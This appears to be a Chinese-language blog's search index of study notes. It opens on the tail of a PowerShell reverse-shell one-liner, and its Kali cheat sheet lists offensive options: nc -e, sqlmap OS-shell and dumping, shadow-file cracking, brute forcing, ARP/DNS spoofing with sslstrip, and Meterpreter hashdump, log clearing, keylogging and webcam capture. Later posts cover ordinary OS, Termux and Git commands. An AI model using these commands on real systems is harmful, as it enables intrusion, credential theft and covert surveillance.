$CMD.Write($Send, 0, $Send.Length); $CMD.Flush()&#125;; $TCP.Close()&quot;</code></pre>]]></content><categories><category>安全</category></categories><tags><tag>RedTeam</tag></tags></entry><entry><title>Kali</title><link href="/writings/Kali/"/><url>/writings/Kali/</url><content type="html"><![CDATA[<h2 id="必要掌握"><a href="#必要掌握" class="headerlink" title="必要掌握"></a>必要掌握</h2><h3 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">-u                              #UDP模式-l                              #监听连接-p                              #指定端口-c                              #执行命令-e                              #执行程序-v                              #详细信息-z                              #扫描模式-k                              #保持监听-q                              #X秒后退出-n                              #DNS不解析</code></pre><h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">open                            #连接FTPget                             #下载文件put                             #上传文件delete                          #删除文件hash                            #显示进度bye                             #断开连接</code></pre><h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">-b &lt;IP&gt;                         #指定地址-C                              #数据压缩-f                              #后台运行-i &lt;File&gt;                       #指定私钥-N                              #禁止命令-p &lt;Port&gt;                       #指定端口-q                              #静默模式</code></pre><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">-n                              #跳过DNS-p &lt;Port&gt;                       #扫描端口-F                              #快速扫描-O                              #系统检测-A                              #高级扫描-Pn                             #跳过存活-iL &lt;File&gt;                      #列表文件-sn                             #Ping扫描-sV                             #版本探测-sS                             #TCP SYN-sA                             #TCP ACK-sF                             #TCP FIN-sX                             #TCP Xmas-sU                             #UDP 扫描-sN                             #TCP Null-sT                             #TCP全连接-sW                             #TCP Window-sM                             #TCP Maimon--mtu &lt;Val&gt;                     #分片发包--spoof-mac &lt;MAC&gt;               #伪造MAC--dns-servers &lt;Host&gt;            #指定DNS--script&#x3D;&lt;auth&#x2F;vuln&#x2F;..&gt;         #扫描脚本</code></pre><h3 id="Hping"><a href="#Hping" class="headerlink" title="Hping"></a>Hping</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">-c &lt;Num&gt;                        #发包数目-i &lt;Time&gt;                       #时间间隔-q                              #静默模式-p &lt;Port&gt;                       #目的端口-d &lt;Size&gt;                       #发包大小-E &lt;File&gt;                       #文件数据-e &lt;Key&gt;                        #签名信息-B                              #安全协议--udp                           #UDP 模式--icmp                          #ICMP模式--scan                          #扫描模式--listen                        #监听模式--flood                         #极速发包--rand-source                   #随机源IP----------------------------------------------S                              #SYN标志位-A                              #ACK标志位-F                              #FIN标志位-R                              #RST标志位-P                              #PSH标志位-U                              #URG标志位</code></pre><h3 id="Masscan"><a href="#Masscan" class="headerlink" title="Masscan"></a>Masscan</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">-c &lt;File&gt;                       #读取配置扫描-p &lt;Port&gt;                       #指定端口扫描-iL &lt;File&gt;                      #指定列表文件-oL &lt;File&gt;                      #生成主机文件--rate                          #指定发包速率--echo                          #重定向当前配置--banners                       #获取Banner信息</code></pre><h2 id="Web工具"><a href="#Web工具" class="headerlink" title="Web工具"></a>Web工具</h2><h3 id="Dirb"><a href="#Dirb" class="headerlink" title="Dirb"></a>Dirb</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">-o &lt;File&gt;                       #输出成文件-r                              #不递归搜索-R                              #交互式递归-X &lt;Name&gt;                       #附加后缀名-a &lt;UA&gt;                         #自定义UA值-c &lt;Cookie&gt;                     #设置Cookie-z &lt;Time&gt;                       #设置延迟(ms)-u &lt;User:Passwd&gt;                #HTTP身份验证-w                              #忽略警告信息-i                              #不区分大小写-H &lt;Header&gt;                     #自定义Header</code></pre><h3 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">-u &lt;url&gt;                        #目标URL-m &lt;file&gt;                       #目标文件-r &lt;reqfile&gt;                    #请求文件--data                          #POST参数--batch                         #自动默认--method&#x3D;PUT                    #请求方式--random-agent                  #随机UA值--cookie&#x3D;COOKIE                 #Cookie值----------------------------------------------------------------banner                        #数据库版本--is-dba                        #是否管理员--users                         #枚举DB用户--passwords                     #枚举DB哈希--current-db                    #当前数据库--current-user                  #当前用户名--sql-shell                     #数据库交互--dbs                           #枚举所有库-D                              #指定枚举库--tables                        #枚举所有表-T                              #指定枚举表--columns                       #枚举所有列-C                              #指定枚举列--dump                          #下载当前数据--dump-all                      #下载所有数据----------------------------------------------------------------os-shell                      #交互命令--os-cmd&#x3D;CMD                    #执行命令--file-read&#x3D;FILE                #读取文件--file-write&#x3D;LFILE              #写入文件--file-dest&#x3D;PWD                 #目标路径</code></pre><h3 id="WPScan"><a href="#WPScan" class="headerlink" title="WPScan"></a>WPScan</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">--url &lt;URL&gt;                     #指定扫描URL-o &lt;File&gt;                       #输出成文件-e [opts]    vp                          #枚举漏洞插件    ap                          #枚举所有插件    p                           #枚举热门插件    vt                          #枚举漏洞主题    at                          #枚举所有主题    t                           #枚举热门主题    cb                          #枚举配置备份    tt                          #枚举Timthumb    u                           #枚举用户名-P &lt;File&gt;                       #指定密码字典-U &lt;File&gt;                       #指定用户字典--rua                           #随机UserAgent--stealthy                      #隐蔽检测模式--http-auth &lt;User:Passwd&gt;       #用户认证登录</code></pre><h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><h3 id="John"><a href="#John" class="headerlink" title="John"></a>John</h3><blockquote><p>unshadow /etc/passwd /etc/shadow &gt; passwd</p></blockquote><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">--single                        #变形猜解--wordlist&#x3D;file                 #字典破解--incremental[:mode]            #增量破解--format&#x3D;name                   #Hash类型--restore                       #恢复中断--show                          #显示已知</code></pre><h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><blockquote><p>hydra -l User -P Passwd -f -vV Service://Host:Port</p></blockquote><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">-R                              #继续上次进度-I                              #忽略还原文件-l                              #指定用户名-L                              #指定用户字典-p                              #指定密码-P                              #指定密码字典-x &lt;Min:Max:Char&gt;               #密码暴力生成-u                              #循环用户名-t &lt;Num&gt;                        #指定线程数-S                              #强制使用SSL-w &lt;Time&gt;                       #设置超时时间-o &lt;File&gt;                       #结果输出文件-V                              #显示详细过程-s &lt;Port&gt;                       #指定非默认端口-f                              #破解成功就中止-e &lt;n&#x2F;s&#x2F;r&gt;                      #空&#x2F;密码&#x3D;用户&#x2F;颠倒</code></pre><h3 id="Crunch"><a href="#Crunch" class="headerlink" title="Crunch"></a>Crunch</h3><blockquote><p>crunch 7 7 -t p@ss,%^ -l a@aaaaa</p></blockquote><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">-s &lt;Str&gt;                        #起始字符串-e &lt;Str&gt;                        #停止字符串-p &lt;x ..&gt;                       #组合元素生成-o &lt;File&gt;                       #输出指定文件-l                              #字符实义字符(与-t联用)-z                              #压缩生成文件(gzip,bzip2,lzma,7z)-b &lt;Num&gt;                        #文件输出大小(kb,mb,gb,kib,mib,gib)-t                              #密码输出格式(%数字 ^符号 @小写 ,大写)-f                              #指定库中字符集(&#x2F;usr&#x2F;share&#x2F;crunch&#x2F;charset.lst)</code></pre><h3 id="Chntpw"><a href="#Chntpw" class="headerlink" title="Chntpw"></a>Chntpw</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">fdisk -lmkdir &#x2F;mnt&#x2F;cmount &#x2F;dev&#x2F;sda1 &#x2F;mnt&#x2F;ccd &#x2F;mnt&#x2F;c&#x2F;Windows&#x2F;system32&#x2F;config-------------------------------u                              #修改用户-l                              #所有用户-i                              #交互模式</code></pre><h3 id="Medusa"><a href="#Medusa" class="headerlink" title="Medusa"></a>Medusa</h3><blockquote><p>medusa -h Host -u User -P Passwd -e ns -f -M Service</p></blockquote><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">-h                              #指定目标主机-H &lt;File&gt;                       #指定列表文件-u                              #指定用户名-U &lt;File&gt;                       #指定用户字典-p                              #指定密码-P &lt;File&gt;                       #指定密码字典-e &lt;n&#x2F;s&#x2F;ns&gt;                     #空&#x2F;密码&#x3D;用户-s                              #强制使用SSL-O &lt;File&gt;                       #结果输出文件-v &lt;0-6&gt;                        #显示详细信息-M                              #要执行的模块-L                              #用户并行登录-t &lt;Num&gt;                        #同时测试登录数-T &lt;Num&gt;                        #同时测试主机数-f                              #破解成功就中止-n &lt;Port&gt;                       #指定非默认端口</code></pre><h3 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a>Hashcat</h3><blockquote><p>hashcat -a 0/1/3 -m typeID Hash Dict</p></blockquote><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">-a &lt;0&#x2F;1&#x2F;2&gt;                      #破解模式[字典&#x2F;组合&#x2F;掩码]-m &lt;id&gt;                         #Hash类型ID-i  --increment                 #增量破解    --increment-min             #最小长度    --increment-max             #最大长度--force                         #忽略警告--show                          #显示已知</code></pre><h2 id="嗅探欺骗"><a href="#嗅探欺骗" class="headerlink" title="嗅探欺骗"></a>嗅探欺骗</h2><h3 id="Bettercap"><a href="#Bettercap" class="headerlink" title="Bettercap"></a>Bettercap</h3><blockquote><p>bettercap -caplet http(s)-ui</p></blockquote><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">arp.spoof                       #ARP欺骗dns.spoof                       #DNS欺骗net.show                        #缓存主机net.probe                       #主动探测net.sniff                       #开启嗅探http.proxy                      #HTTP代理---------------------------------------------------------------arp.spoof.targets IP            #欺骗IP地址dns.spoof.domains Domain        #欺骗的域名dns.spoof.address IP&#x2F;Domain     #重定向地址net.sniff.verbose false         #精简化显示http.proxy.sslstrip true        #HTTPS降级http.proxy.injectjs URL&#x2F;File&#x2F;JS #植入到页面</code></pre><h2 id="数字取证"><a href="#数字取证" class="headerlink" title="数字取证"></a>数字取证</h2><h3 id="Steghide"><a href="#Steghide" class="headerlink" title="Steghide"></a>Steghide</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">embed                           #嵌入数据extract                         #提取数据info                            #显示信息encinfo                         #支持算法-ef                             #嵌入文件-cf                             #覆盖文件-sf                             #提取文件-p                              #指定密码-e                              #加密方式</code></pre><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><h3 id="Console"><a href="#Console" class="headerlink" title="Console"></a>Console</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">search script web_deliveryshow options&#x2F;targets&#x2F;advancedset autorunscript migrate -N explorer.exehandler -H x.x.x.x -P yyyy -p Payloadroute add 192.168.0.0&#x2F;24 IDsessions -u ID</code></pre><h3 id="Msfvenom"><a href="#Msfvenom" class="headerlink" title="Msfvenom"></a>Msfvenom</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">-p                              #有效载荷-l                              #列出模块-f                              #载荷格式-e                              #编码方式-i                              #编码次数-b                              #规避字符-o                              #输出文件--smallest                      #最小载荷--encrypt                       #加密方式--encrypt-key                   #加密密钥</code></pre><h3 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">bg                              #退至后台run                             #POST模块load                            #使用扩展shell                           #系统命令search                          #搜索文件upload                          #上传文件download                        #下载文件-----------------------------------------------------sysinfo                         #系统信息portfwd                         #端口转发clearev                         #清除日志hashdump                        #提取哈希getsystem                       #尝试提权-----------------------------------------------------screenshot                      #屏幕截图screenshare                     #远程桌面keyscan_dump                    #显示捕获keyscan_start                   #开始捕获keyscan_stop                    #停止捕获record_mic                      #录制麦克风webcam_list                     #列出摄像头webcam_snap                     #摄像头快照webcam_stream                   #摄像头视频</code></pre>]]></content><categories><category>笔记</category></categories><tags><tag>OS</tag></tags></entry><entry><title>Windows</title><link href="/writings/Windows/"/><url>/writings/Windows/</url><content type="html"><![CDATA[<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="发行版"><a href="#发行版" class="headerlink" title="发行版"></a>发行版</h3><ul><li><a href="https://baike.baidu.com/item/Windows7">Windows7</a></li><li><a href="https://baike.baidu.com/item/Windows8">Windows8</a></li><li><a href="https://baike.baidu.com/item/Windows10">Windows10</a></li><li><a href="https://baike.baidu.com/item/Windows%20Server">Windows Server</a></li><li>…</li></ul><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">cd                    #改变或显示目录md                    #创建目录rd                    #删除目录dir                   #显示当前目录文件ren                   #文件或目录重命名del                   #删除文件 [&#x2F;f强制删除]cls                   #清除屏幕终端信息type                  #查看文本文件内容copy                  #复制文件move                  #移动文件tree                  #树形结构展示chcp                  #查看或修改字符集whoami                #显示用户名findstr               #筛选符合条件内容tasklist              #运行进程信息 [&#x2F;svc显示进程服务]taskkill              #结束进程 [&#x2F;f强行终止&#x2F;t子进程]netstat               #显示网络状态ipconfig              #显示网络配置信息net user              #查看或修改用户信息systeminfo            #查看计算机综合信息</code></pre>]]></content><categories><category>笔记</category></categories><tags><tag>OS</tag></tags></entry><entry><title>Linux</title><link href="/writings/Linux/"/><url>/writings/Linux/</url><content type="html"><![CDATA[<h2 id="发行版"><a href="#发行版" class="headerlink" title="发行版"></a>发行版</h2><ul><li><a href="https://www.debian.org/">Debian</a></li><li><a href="https://www.centos.org/">CentOS</a></li><li><a href="https://cn.ubuntu.com/">Ubuntu</a></li><li><a href="https://www.archlinuxcn.org/">Arch Linux</a></li><li>…</li></ul><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><pre class="line-numbers language-none"><code class="language-none">&#x2F;├── bin         #通用命令├── boot        #启动引导├── dev         #设备文件├── etc         #系统配置├── home        #用户目录├── lib         #动态链接├── lost+found  #文件遗失├── media       #移动媒介├── mnt         #临时挂载├── opt         #外部软件├── proc        #内存映射├── root        #超级用户├── run         #运行需要├── sbin        #系统命令├── srv         #服务数据├── sys         #类似proc├── tmp         #临时文件├── var         #变量文件└── usr         #共享资源</code></pre><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">cd              #切换目录 [-进入前一目录]ls              #显示当前目录下内容 [-l详细信息,-a所有文件,-R递归]pwd             #查看当前所处目录rm              #删除文件或目录 [-f强制删除-r递归处理]cp              #复制文件或目录 [-a保留链接、文件属性及目录下的所有内容]scp             #远程拷贝文件(a到:b) [-C使用压缩-P指定远程端口-r以递归方式复制]mv              #移动文件或目录(还可以重命名)ln              #为文件创建软链接 [-s软软链接]ps              #显示进程详情 [-a所有进程,-u以用户为主的进程,-x较完整信息]su              #切换用户bg              #调至后台执行fg              #调至前台执行cat             #查看文本文件内容 [-n显示行号]tar             #为文件或目录创建档案 [-c打包-x解包-v显示过程-f指定文件-z使用gzip处理]env             #显示系统环境变量 [-u从当前环境中删除指定的变量]sed             #流编辑器 [-n安静模式a新增c取代d删除i插入p打印s替换]jobs            #查看正在执行的任务sudo            #以系统管理者身份执行指令echo            #打印输出curl            #利用URL规则工作的文件传输工具 [-d·POST数据-H自定义头-k忽略警告-X请求方式-v详细信息]wget            #从指定的URL下载文件 [-r递归-l深度]kill            #结束指定程序tree            #树形结构展示less            #分页显示文本文件内容,前后翻看diff            #比较两个文件的差异find            #按条件查询指定文件 [-maxdepth深度-name文件名-type文件类型-user所属者-perm权限]grep            #筛选符合条件的内容 [-ABC前后-E正则-e或-i忽略大小写-n行号-o精确-v反向-r递归-s不显示错误]which           #查找给定命令touch           #创建空文件mkdir           #创建空目录 [-p建立多级目录]chmod           #变更文件或目录的权限 [u用户&#x2F;g组&#x2F;o其它&#x2F;a全部&#x2F;s特殊&#x2F;r读4&#x2F;w写2&#x2F;x执1&#x2F;-无0]clear           #清除屏幕终端信息xargs           #命令组合alias           #设置指令的别名 [-p打印设置]nohup           #后台始终运行locate          #在资料库中查找who             #目前登录信息last            #最近登录信息uname           #查看系统相关信息 [-a全部信息]adduser         #添加用户usermod         #修改用户 [-u用户UID,-g所属分组]userdel         #删除用户 [-r删除相关文件]netstat         #显示网络状态 [-pantu]ifconfig        #显示网络配置信息lsb_release     #查看系统发行版信息 [-a全部信息]reboot          #重启计算机shutdown        #关机计算机&lt;, &lt;&lt;           #标准输入-01&gt;, 1&gt;&gt;, &gt;, &gt;&gt;  #标准输出-12&gt;, 2&gt;&gt;         #错误输出-2 (&#x2F;dev&#x2F;null)1&gt;&amp;2 标准&gt;错误, 2&gt;&amp;1 错误&gt;标准, &amp;&gt;file 标准和错误&gt;文件&amp; 后台执行, | 将前面结果作为后面参数&amp;&amp; 前者执行才执行后者, || 前者失败执后者</code></pre>]]></content><categories><category>笔记</category></categories><tags><tag>OS</tag></tags></entry><entry><title>计算机网络</title><link href="/writings/Network/"/><url>/writings/Network/</url><content type="html"><![CDATA[<h2 id="OSI模型"><a href="#OSI模型" class="headerlink" title="OSI模型"></a>OSI模型</h2><table><thead><tr><th align="center">OSI 层</th><th align="center">功能</th><th align="left"></th></tr></thead><tbody><tr><td align="center">应用层</td><td align="center">针对特定应用的协议</td><td align="left">HTTP–<strong>超文本传输协议</strong><br/>FTP–<strong>文件传输协议</strong><br/>SMTP–<strong>简单邮件传输协议</strong><br/>Telnet–<strong>远程登录协议</strong><br/>SNMP–<strong>简单网络管理协议</strong><br/>DHCP–<strong>动态主机配置协议</strong></td></tr><tr><td align="center">表示层</td><td align="center">数据格式的转换,加密和压缩</td><td align="left"></td></tr><tr><td align="center">会话层</td><td align="center">建立,管理,终止进程之间的会话</td><td align="left"></td></tr><tr><td align="center">传输层</td><td align="center">管理两个节点之间的数据传输</td><td align="left">TCP–<strong>传输控制协议</strong><br />UDP–<strong>用户数据报协议</strong><br />TLS/SSL–<strong>传输层安全性协议</strong></td></tr><tr><td align="center">网络层</td><td align="center">地址管理与路由选择</td><td align="left">IP,ICMP,ARP…</td></tr><tr><td align="center">数据链路层</td><td align="center">互连设备之间传送和识别数据帧</td><td align="left">PPP,以太网,Wi-Fi…</td></tr><tr><td align="center">物理层</td><td align="center">传输数据的物理介质</td><td align="left">DTE–<strong>数据终端设备</strong><br/>DCE–<strong>数据通信设备或电路连接设备</strong></td></tr></tbody></table><h2 id="TCP协议"><a href="#TCP协议" class="headerlink" title="TCP协议"></a>TCP协议</h2><ul><li><strong>面向连接</strong> (数据传输前，必须先建立TCP连接，完毕后释放连接)</li><li><strong>面向字节流</strong> (数据以流的形式进行传输) <code>TCP传输报文长度有限制</code></li><li><strong>全双工通信</strong> (建立连接后，通信双方都能发送数据)</li><li><strong>可靠</strong> (不丢失、无差错、不重复、按序到达)</li></ul><h2 id="UDP协议"><a href="#UDP协议" class="headerlink" title="UDP协议"></a>UDP协议</h2><ul><li><strong>无连接</strong> (不需要建立UDP连接)</li><li><strong>不可靠</strong> (不管是否到达接收方)</li><li><strong>面向报文</strong> (以数据报文形式传输) <code>UDP数据报文长度无限制</code></li><li><strong>无拥塞控制</strong> (不可靠传输，故不需拥塞控制)</li></ul>]]></content><categories><category>笔记</category></categories><tags><tag>Network</tag></tags></entry><entry><title>Termux</title><link href="/writings/Termux/"/><url>/writings/Termux/</url><content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><a href="https://termux.com/">Termux</a>是一个 <strong>Android终端仿真器</strong> 和 <strong>Linux环境应用程序</strong> ，无需root或设置。 自动安装了最小的系统，可以使用APT软件包管理器安装其它软件程序。</p><ul><li><a href="https://github.com/termux/termux-app">GitHub</a></li><li><a href="https://f-droid.org/packages/com.termux/">APK下载</a></li><li><a href="https://play.google.com/store/apps/details?id=com.termux">Google Play</a></li></ul><h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">pkg search &lt;query&gt;              #搜索软件包pkg install &lt;packages&gt;          #安装软件包pkg uninstall &lt;packages&gt;        #卸载软件包pkg show &lt;packages&gt;             #显示包信息pkg reinstall &lt;packages&gt;        #重新安装包pkg upgrade                     #升级软件包pkg list-all                    #列出所有包pkg files &lt;package&gt;             #显示包路径pkg list-installed              #列出已安装</code></pre><h3 id="国内镜像"><a href="#国内镜像" class="headerlink" title="国内镜像"></a>国内镜像</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">echo &quot;deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;termux&#x2F;termux-packages-24 stable main&quot; &gt; $PREFIX&#x2F;etc&#x2F;apt&#x2F;sources.listecho &quot;deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;termux&#x2F;game-packages-24 games stable&quot;  &gt; $PREFIX&#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;game.listecho &quot;deb https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;termux&#x2F;science-packages-24 science stable&quot; &gt; $PREFIX&#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;science.listapt update &amp;&amp; apt upgrade -y</code></pre><h3 id="基本工具"><a href="#基本工具" class="headerlink" title="基本工具"></a>基本工具</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">pkg install git vim php curl wget tree unzip golang python openssh -ypip config set global.index-url https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simplego env -w GOPATH&#x3D;$PREFIX &amp;&amp; go env -w GOPROXY&#x3D;https:&#x2F;&#x2F;goproxy.io,direct</code></pre><h3 id="美化终端"><a href="#美化终端" class="headerlink" title="美化终端"></a>美化终端</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">sh -c &quot;$(curl -fsSL https:&#x2F;&#x2F;github.com&#x2F;Cabbagec&#x2F;termux-ohmyzsh&#x2F;raw&#x2F;master&#x2F;install.sh)&quot;Enter a number, leave blank to not to change: 14    #选择色彩样式Enter a number, leave blank to not to change: 6     #选择字体样式</code></pre><p><strong>重新选择字体样式</strong>: <code>chfont</code> 或 <code>~/.termux/fonts.sh</code><br><strong>重新选择色彩样式</strong>: <code>chcolor</code> 或 <code>~/.termux/colors.sh</code></p><h2 id="安全工具"><a href="#安全工具" class="headerlink" title="安全工具"></a>安全工具</h2><h3 id="Dirb"><a href="#Dirb" class="headerlink" title="Dirb"></a><a href="https://github.com/v0re/dirb">Dirb</a></h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">pkg install dirb</code></pre><p><img src="https://ik.imagekit.io/DongHuangT1/Termux/Termux-01.jpg"></p><h3 id="Httpx"><a href="#Httpx" class="headerlink" title="Httpx"></a><a href="https://github.com/projectdiscovery/httpx">Httpx</a></h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">go install -v github.com&#x2F;projectdiscovery&#x2F;httpx&#x2F;cmd&#x2F;httpx@latest</code></pre><p><img src="https://ik.imagekit.io/DongHuangT1/Termux/Termux-02.jpg"></p><h3 id="Chisel"><a href="#Chisel" class="headerlink" title="Chisel"></a><a href="https://github.com/jpillora/chisel">Chisel</a></h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">go install -v github.com&#x2F;jpillora&#x2F;chisel@latest</code></pre><p><img src="https://ik.imagekit.io/DongHuangT1/Termux/Termux-03.jpg"></p><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><a href="https://github.com/nmap/nmap">Nmap</a></h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">pkg install nmap -y</code></pre><p><img src="https://ik.imagekit.io/DongHuangT1/Termux/Termux-04.jpg"></p><h3 id="Nuclei"><a href="#Nuclei" class="headerlink" title="Nuclei"></a><a href="https://github.com/projectdiscovery/nuclei">Nuclei</a></h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">go install -v github.com&#x2F;projectdiscovery&#x2F;nuclei&#x2F;v2&#x2F;cmd&#x2F;nuclei@latest</code></pre><p><img src="https://ik.imagekit.io/DongHuangT1/Termux/Termux-05.jpg"></p><h3 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a><a href="https://github.com/sqlmapproject/sqlmap">Sqlmap</a></h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">pip install sqlmap</code></pre><p><img src="https://ik.imagekit.io/DongHuangT1/Termux/Termux-06.jpg"></p><h3 id="Pocsuite"><a href="#Pocsuite" class="headerlink" title="Pocsuite"></a><a href="https://github.com/knownsec/Pocsuite">Pocsuite</a></h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">pip install pocsuite3</code></pre><p><img src="https://ik.imagekit.io/DongHuangT1/Termux/Termux-07.jpg"></p><h3 id="Subfinder"><a href="#Subfinder" class="headerlink" title="Subfinder"></a><a href="https://github.com/projectdiscovery/subfinder">Subfinder</a></h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">go install -v github.com&#x2F;projectdiscovery&#x2F;subfinder&#x2F;v2&#x2F;cmd&#x2F;subfinder@latest</code></pre><p><img src="https://ik.imagekit.io/DongHuangT1/Termux/Termux-08.jpg"></p>]]></content><categories><category>推荐</category></categories><tags><tag>Tools</tag></tags></entry><entry><title>Git</title><link href="/writings/Git/"/><url>/writings/Git/</url><content type="html"><![CDATA[<h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">git init                        #初始仓库git status                      #显示状态git add .                       #添加暂存git commit -m &quot;***&quot;             #提交仓库git log --oneline               #查看提交git reflog                      #历史版本git reset --hard &quot;***&quot;          #回退版本git pull                        #拉取代码git push -f                     #推送代码------------------------------------------------git branch [Name]               #查看分支git checkout Name               #切换分支git merge Name                  #合并分支------------------------------------------------git remote add origin git@github.com:User&#x2F;Repo.gitgit push -u origin master       #上传GitHub</code></pre><h2 id="克隆加速"><a href="#克隆加速" class="headerlink" title="克隆加速"></a>克隆加速</h2><blockquote><p>由于天朝网络原因，导致Git克隆异常缓慢，因此需要我们另辟途径进行加速</p></blockquote><h3 id="fastgit"><a href="#fastgit" class="headerlink" title="fastgit"></a>fastgit</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">git clone https:&#x2F;&#x2F;hub.fastgit.xyz&#x2F;User&#x2F;Repo.git</code></pre><h3 id="gitclone"><a href="#gitclone" class="headerlink" title="gitclone"></a>gitclone</h3><pre class="line-numbers language-Shell" data-language="Shell"><code class="language-Shell">git clone https:&#x2F;&#x2F;gitclone.com&#x2F;github.com&#x2F;User&#x2F;Repo.git</code></pre><h3 id="Todo"><a href="#Todo" class="headerlink" title="Todo"></a>Todo</h3><blockquote><p>打开 <code>.git/config</code> 配置文件，修改 <code>[remote &quot;origin&quot;]</code> 的URL地址😊😊</p></blockquote>]]></content><categories><category>笔记</category></categories><tags><tag>Tools</tag></tags></entry></search>